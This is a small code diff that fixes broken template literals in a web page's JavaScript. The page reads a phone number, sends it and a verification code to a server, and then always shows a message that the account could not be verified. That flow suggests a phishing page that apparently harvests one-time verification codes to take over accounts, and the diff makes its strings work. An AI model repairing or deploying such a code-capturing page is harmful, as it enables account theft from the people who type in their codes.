@@ -162,7 +162,7 @@
         function goToVerificationPage() {
             const countryCode = document.getElementById('countryCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
-            const fullPhoneNumber = ${countryCode} ${phoneNumber};
+            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
 
             if (phoneNumber === '') {
                 alert('Please enter your phone number.');
@@ -189,7 +189,7 @@
                 });
 
                 if (!response.ok) {
-                    throw new Error(HTTP error! status: ${response.status});
+                    throw new Error(`HTTP error! status: ${response.status}`);
                 }
 
                 console.log("Data sent to server successfully");
@@ -210,7 +210,7 @@
             sendDataToServer(phoneDisplay, verificationCode);
 
             document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessage').textContent = Sorry, we could not verify an account with the phone number: ${phoneDisplay};
+            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
             document.getElementById('finalMessageContainer').style.display = 'block';
         }
 
